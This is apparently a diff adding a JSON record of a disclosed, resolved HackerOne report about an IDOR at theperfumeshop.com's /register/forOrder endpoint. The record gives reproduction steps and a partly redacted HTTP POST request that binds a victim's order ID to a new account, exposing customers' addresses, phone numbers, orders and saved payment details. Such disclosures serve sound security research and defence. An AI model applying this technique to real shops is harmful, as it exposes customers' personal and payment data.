@@ -1,0 +1,153 @@
+{
+  "id": 1618100,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjE4MTAw",
+  "url": "https://hackerone.com/reports/1618100",
+  "title": "PII Disclosure At `theperfumeshop.com/register/forOrder`",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2022-06-28T16:21:34.756Z",
+  "submitted_at": "2022-06-28T16:21:34.888Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "alp",
+    "url": "/alp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/0fi7a4a4x563itbm4bljb8kdqll5/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 48354,
+    "url": "https://hackerone.com/watson_group",
+    "handle": "watson_group",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/i5eu11xw98k5xa3dmxyk5sfvoi45/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/i5eu11xw98k5xa3dmxyk5sfvoi45/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "A.S. Watson Group ",
+      "twitter_handle": "",
+      "website": "https://www.aswatson.com",
+      "about": "AS Watson Group is the world's largest health and beauty retail group."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-01-23T08:54:50.075Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-01-23T08:54:49.905Z",
+  "team_member_agreed_on_going_public_at": "2024-01-23T08:50:16.075Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nHello there! I found a way to accesing any user's PII (full address, phone number, full name, ** all orders**, payment details [if the victim already saved before] )  who created a order in The Perfume Shop. \n\nThis is happening via https://theperfumeshop.com/register/forOrder endpoint. I realized this endpoint after the guest checkout process was completed.\n\n## Steps To Reproduce:\n\n1. Open https://theperfumeshop.com website on your browser ( do not login to any account ).\n2. Go to a product and add to your basket then, get your CSRF token and cookies.\n3. Find a order ID who you want to attack. You can try with my order ID: `664448593`\n4. Repeat this request on Burp Suite after replacing with the CSRF token, cookies, an email that not registered before and the order ID of the victim:\n\n```http\nPOST /register/forOrder HTTP/2\nHost: www.theperfumeshop.com\nCookie: █████\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: █████checkout/orderConfirmationByReferenceId/PROD_00000000000\nContent-Type: application/x-www-form-urlencoded\nOrigin: https://www.theperfumeshop.com\nDnt: 1\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nTe: trailers\n\norderCode=[order-id-of-victim]&email=[put-here-random-email]&associateCard=yes&termsCheck=1&dateOfBirth.day=██████████&dateOfBirth.month=█████████&dateOfBirth.year=███&pwd=███&checkPwd=██████&CSRFToken=[csrf-token-here]\n```\n\nYou'll see `Location: ███████serverError` on response, this meant attack succesfully completed.\n\n5. Go to ████████login page and login with the random email that you put in the request and this password -> `████`. \n6. After succesfully logged into the account, check addressses, orders and personal information.\n\nHere's a proof of concept:\n\n██████\n\nAlso, I set this report severity to Critical because CVSS calculator's response and comment of @lesswood in the #1542373:\n\n> ███████\n\n\nSo, since I can easily harvest PII (full address, phone number, full name, ** all orders**, payment details [if the victim already saved before] ) and take over a system (can delete orders from victim's own account) without any privileges.\n\n## Impact\n\nAccesing any user's PII (full address, phone number, full name, ** all orders**, payment details [if the victim already saved before] )  who created a order in The Perfume Shop.",
+  "weakness": {
+    "id": 55,
+    "name": "Insecure Direct Object Reference (IDOR)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 92,
+  "voters": [
+    "0xhuz",
+    "immahdisv",
+    "prathap_ilango",
+    "skoll101",
+    "popobawa",
+    "achabi7",
+    "n1m0",
+    "ganeshbagaria",
+    "drsniper",
+    "alp",
+    "and 82 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.7,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 72114,
+    "asset_type": "OTHER",
+    "asset_identifier": "The Perfume Shop",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 395716,
+      "category": "researcher",
+      "content": "Recon is key. Always try to check all the features even need to spend money. Also, if you get an error message in response, try checking your input in other forms. Doing this gave me a reward of $5,111.\n\nI share bug bounty tips on Twitter. If you don’t want to miss them you can follow me at https://twitter.com/alp0x01",
+      "user": {
+        "id": 394492,
+        "username": "alp",
+        "name": "",
+        "bio": "Security & Finance",
+        "cleared": true,
+        "verified": true,
+        "website": "https://alp.omg.lol",
+        "location": "",
+        "created_at": "2018-11-02T19:59:02.469Z",
+        "url": "https://hackerone.com/alp",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/0fi7a4a4x563itbm4bljb8kdqll5/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/0fi7a4a4x563itbm4bljb8kdqll5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/0fi7a4a4x563itbm4bljb8kdqll5/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    }
+  ]
+}
